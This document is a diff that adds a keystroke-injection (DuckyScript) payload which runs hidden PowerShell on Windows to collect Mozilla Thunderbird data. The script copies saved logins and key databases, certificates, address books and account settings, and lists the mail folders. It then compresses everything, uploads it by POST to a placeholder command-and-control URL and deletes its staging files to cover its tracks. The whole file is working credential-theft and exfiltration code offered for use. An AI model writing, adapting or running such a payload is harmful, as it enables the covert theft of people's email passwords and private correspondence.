@@ -1,0 +1,108 @@
+REM ==========================================
+REM Title: Thunderbird Email Data Extractor
+REM Author: NullSec Suite
+REM Target: Windows 10/11
+REM Description: Locates and extracts Mozilla
+REM   Thunderbird email profile data including
+REM   stored credentials, address books, local
+REM   mail storage, and account configuration.
+REM   Compresses and exfiltrates to C2 server.
+REM Category: Collection / Credential Access
+REM ==========================================
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -W Hidden -NoProfile -ExecutionPolicy Bypass
+ENTER
+DELAY 1000
+REM Set variables
+STRING $exfilUrl = 'https://ATTACKER_C2/collect'
+ENTER
+DELAY 350
+STRING $tbDir = "$env:APPDATA\Thunderbird"
+ENTER
+DELAY 350
+STRING $stagingDir = "$env:TEMP\tb_dump"
+ENTER
+DELAY 350
+STRING New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null
+ENTER
+DELAY 400
+REM Check if Thunderbird is installed
+STRING if (-not (Test-Path $tbDir)) { Write-Host 'Thunderbird not found'; exit }
+ENTER
+DELAY 400
+REM Parse profiles.ini to find profile directories
+STRING $profilesIni = Get-Content "$tbDir\profiles.ini" -ErrorAction SilentlyContinue
+ENTER
+DELAY 350
+STRING $profilePaths = @()
+ENTER
+DELAY 350
+STRING $profilesIni | ForEach-Object { if ($_ -match '^Path=(.+)') { $profilePaths += $matches[1] } }
+ENTER
+DELAY 400
+REM Extract key files from each profile
+STRING $targetFiles = @('logins.json','key4.db','key3.db','cert9.db','signons.sqlite','abook.mab','history.mab','prefs.js','persdict.dat')
+ENTER
+DELAY 400
+STRING foreach ($pp in $profilePaths) {
+ENTER
+DELAY 300
+STRING   $fullPath = if ($pp -match '^[A-Z]:') { $pp } else { "$tbDir\$pp" }
+ENTER
+DELAY 300
+STRING   if (Test-Path $fullPath) {
+ENTER
+DELAY 300
+STRING     $profName = Split-Path $fullPath -Leaf
+ENTER
+DELAY 300
+STRING     $destDir = "$stagingDir\$profName"
+ENTER
+DELAY 300
+STRING     New-Item -ItemType Directory -Path $destDir -Force | Out-Null
+ENTER
+DELAY 300
+STRING     foreach ($f in $targetFiles) {
+ENTER
+DELAY 300
+STRING       $src = Join-Path $fullPath $f
+ENTER
+DELAY 300
+STRING       if (Test-Path $src) { Copy-Item $src $destDir -Force }
+ENTER
+DELAY 300
+STRING     }
+ENTER
+DELAY 300
+REM Also grab the ImapMail and Mail directory listings
+STRING     Get-ChildItem "$fullPath\ImapMail" -Recurse -ErrorAction SilentlyContinue | Select FullName,Length | Out-File "$destDir\imap_listing.txt" -Force
+ENTER
+DELAY 300
+STRING     Get-ChildItem "$fullPath\Mail" -Recurse -ErrorAction SilentlyContinue | Select FullName,Length | Out-File "$destDir\mail_listing.txt" -Force
+ENTER
+DELAY 300
+STRING   }
+ENTER
+DELAY 300
+STRING }
+ENTER
+DELAY 500
+REM Compress for exfiltration
+STRING $zipPath = "$env:TEMP\tb_data_$(Get-Date -Format 'yyyyMMdd').zip"
+ENTER
+DELAY 350
+STRING Compress-Archive -Path "$stagingDir\*" -DestinationPath $zipPath -Force
+ENTER
+DELAY 500
+REM Exfiltrate
+STRING try { Invoke-RestMethod -Uri $exfilUrl -Method POST -InFile $zipPath -ContentType 'application/octet-stream' -Headers @{'X-Host'=$env:COMPUTERNAME;'X-Type'='thunderbird'} } catch {}
+ENTER
+DELAY 500
+REM Cleanup
+STRING Remove-Item $stagingDir,$zipPath -Recurse -Force 2>$null
+ENTER
+DELAY 350
+STRING exit
+ENTER
